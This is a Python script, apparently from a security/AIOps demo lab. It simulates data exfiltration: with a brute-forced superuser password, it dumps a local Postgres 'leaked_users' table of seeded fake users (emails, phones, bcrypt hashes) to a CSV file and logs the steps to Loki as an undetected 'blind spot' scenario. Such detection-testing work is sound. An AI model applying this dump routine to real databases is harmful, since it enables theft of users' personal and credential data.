"""
scenarios/category2_security/data_exfil.py

Step 2: leafy superuser 계정으로 DB 직접 접속,
        leaked_users 테이블 전체 탈취 후 CSV 저장 + Loki 이벤트 푸시.

pgminer_integrated.py의 run_dump() 대체 진입점: main()
"""

from __future__ import annotations

import csv
import json
import os
import subprocess
import time
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.rule import Rule
from rich.table import Table

console = Console()

DB_CONTAINER = os.getenv("DB_CONTAINER", "leafy-db")
DB_NAME      = os.getenv("DB_NAME",      "leafy")
DB_USER      = os.getenv("DB_USER",      "leafy")
LOKI_URL     = os.getenv("LOKI_URL",     "http://localhost:3100")
EXFIL_PATH   = Path(os.getenv("EXFIL_PATH", "/tmp/exfiltrated_users.csv"))
TARGET_TABLE = "leaked_users"


def _push_loki(event: str, status: str = "INFO", **fields) -> None:
    ts_ns = str(int(time.time() * 1_000_000_000))
    body  = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "scenario":  "pgminer_exfil",
        "event":     event,
        "status":    status,
        **fields,
    }
    payload = {
        "streams": [{
            "stream": {
                "job":      "aiops-timeline",
                "scenario": "pgminer_exfil",
                "event":    event,
                "status":   status,
            },
            "values": [[ts_ns, json.dumps(body, ensure_ascii=False)]],
        }]
    }
    try:
        req = urllib.request.Request(
            f"{LOKI_URL}/loki/api/v1/push",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=3).read()
    except Exception:
        pass


def _psql(sql: str, password: str) -> tuple[int, str]:
    cmd = [
        "docker", "exec",
        "-e", f"PGPASSWORD={password}",
        DB_CONTAINER,
        "psql", "-U", DB_USER, "-d", DB_NAME,
        "-t", "--no-align", "-c", sql,
    ]
    r = subprocess.run(cmd, capture_output=True, timeout=15)
    return r.returncode, r.stdout.decode("utf-8", errors="replace").strip()


def _psql_csv(sql: str, password: str) -> tuple[int, list[list[str]]]:
    cmd = [
        "docker", "exec",
        "-e", f"PGPASSWORD={password}",
        DB_CONTAINER,
        "psql", "-U", DB_USER, "-d", DB_NAME,
        "--csv", "-c", sql,
    ]
    r = subprocess.run(cmd, capture_output=True, timeout=15)
    raw = r.stdout.decode("utf-8", errors="replace").strip()
    if r.returncode != 0 or not raw:
        return r.returncode, []
    return r.returncode, [line.split(",") for line in raw.splitlines()]


def _ensure_table(password: str) -> bool:
    rc, out = _psql(
        f"SELECT COUNT(*) FROM information_schema.tables "
        f"WHERE table_name = '{TARGET_TABLE}';",
        password,
    )
    if rc != 0:
        console.print(f"  [red]→ DB 연결 실패 (rc={rc})[/red]")
        return False

    if out.strip() == "0":
        console.print(f"  [yellow]→ {TARGET_TABLE} 없음 — 긴급 시딩[/yellow]")
        seed = f"""
        CREATE TABLE IF NOT EXISTS {TARGET_TABLE} (
            id SERIAL PRIMARY KEY,
            username VARCHAR(50), email VARCHAR(100) UNIQUE,
            password_hash VARCHAR(255), phone VARCHAR(20),
            role VARCHAR(20) DEFAULT 'user', created_at TIMESTAMP DEFAULT NOW()
        );
        INSERT INTO {TARGET_TABLE} (username, email, password_hash, phone, role) VALUES
        ('admin',       'admin@leafy-corp.com',       '$2b$12$xK9...', '010-0000-0001', 'admin'),
        ('kim_junho',   'junho.kim@leafy-corp.com',   '$2b$12$aB1...', '010-1234-5678', 'user'),
        ('lee_soyeon',  'soyeon.lee@leafy-corp.com',  '$2b$12$bC2...', '010-2345-6789', 'user'),
        ('park_minjae', 'minjae.park@leafy-corp.com', '$2b$12$cD3...', '010-3456-7890', 'user'),
        ('choi_yuna',   'yuna.choi@leafy-corp.com',   '$2b$12$dE4...', '010-4567-8901', 'user')
        ON CONFLICT (email) DO NOTHING;
        """
        rc, _ = _psql(seed, password)
        return rc == 0
    return True


def run_exfil(cracked_password: str | None = None) -> list[dict]:
    password = cracked_password or os.getenv("DB_PASSWORD", "leafy_secret")

    console.print()
    console.print(Rule("[bold red]🔍  Step 2 — Data Exfiltration[/bold red]", style="red"))
    console.print(Panel(
        f"[bold]대상 컨테이너:[/bold]  {DB_CONTAINER}\n"
        f"[bold]DB / 계정:[/bold]      {DB_NAME} / {DB_USER}  ← superuser\n"
        f"[bold]획득 경위:[/bold]      [red]브루트포스 크레덴셜[/red]\n"
        f"[bold]탈취 대상:[/bold]      {TARGET_TABLE} 테이블 전체\n"
        f"[bold]저장 경로:[/bold]      {EXFIL_PATH}",
        title="[bold red]💀  Exfiltration Target[/bold red]",
        border_style="red",
        padding=(1, 2),
    ))

    _push_loki("exfil_started", status="STARTED",
               target=f"{DB_NAME}.{TARGET_TABLE}", container=DB_CONTAINER)

    if not _ensure_table(password):
        _push_loki("exfil_failed", status="FAILED", reason="DB connection error")
        return []

    rc, count_str = _psql(f"SELECT COUNT(*) FROM {TARGET_TABLE};", password)
    total = int(count_str) if rc == 0 and count_str.isdigit() else 0
    console.print(f"  [yellow]→ {TARGET_TABLE}: {total}개 레코드 발견[/yellow]")

    rc, rows = _psql_csv(
        f"SELECT id, username, email, password_hash, phone, role, created_at "
        f"FROM {TARGET_TABLE} ORDER BY id;",
        password,
    )
    if rc != 0 or not rows:
        console.print(f"  [red]→ 쿼리 실패 (rc={rc})[/red]")
        _push_loki("exfil_failed", status="FAILED", reason="query error")
        return []

    header, data_rows = rows[0], rows[1:]

    table = Table(
        box=box.SIMPLE_HEAVY, border_style="red",
        show_header=True, header_style="bold red",
        title=f"[bold red]⚠  탈취된 사용자 데이터 (상위 {min(10, len(data_rows))}건)[/bold red]",
    )
    for col in header:
        table.add_column(col.strip(), no_wrap=(col.strip() == "email"))
    for row in data_rows[:10]:
        table.add_row(*[c.strip() for c in row])
    console.print(table)

    if len(data_rows) > 10:
        console.print(f"  [dim]... 외 {len(data_rows) - 10}건 (CSV 파일 참조)[/dim]")

    EXFIL_PATH.parent.mkdir(parents=True, exist_ok=True)
    with open(EXFIL_PATH, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([h.strip() for h in header])
        writer.writerows([[c.strip() for c in row] for row in data_rows])

    console.print(Panel(
        f"[red bold]레코드 수:[/red bold]   {len(data_rows)}개\n"
        f"[red bold]포함 정보:[/red bold]   이메일, 전화번호, bcrypt 해시, 권한 등급\n"
        f"[red bold]저장 위치:[/red bold]   {EXFIL_PATH}\n\n"
        f"[dim]→ 실제 공격 시 이 파일이 외부 C2 서버로 전송됩니다[/dim]",
        title="[bold red]💀  Exfiltration Complete[/bold red]",
        border_style="red",
        padding=(1, 2),
    ))

    _push_loki("exfil_completed", status="SUCCESS",
               records_exfiltrated=len(data_rows),
               output_file=str(EXFIL_PATH))

    return [dict(zip([h.strip() for h in header], [c.strip() for c in row]))
            for row in data_rows]


def main() -> None:
    try:
        from brute_force import get_cracked_password
        pw = get_cracked_password()
    except ImportError:
        pw = None
    run_exfil(pw)


SCENARIO_META = {
    "id":             "data_exfil",
    "label":          "데이터 탈취 (탐지 사각지대)",
    "subtitle":       "leaked_users 전체 덤프 → CSV  ·  alert 없음",
    "category":       "보안",
    "owasp":          "A01:2021",
    "mitre":          "TA0010",
    "container":      "leafy-db",
    "loki_container": "leafy-db",
    "alert_name":     "없음 (탐지 사각지대)",
    "alert_fires":    False,
    "blind_spot":     True,
    "module":         "category2_security.data_exfil",
    "custom_panel":   "data_exfil",
}

if __name__ == "__main__":
    main()
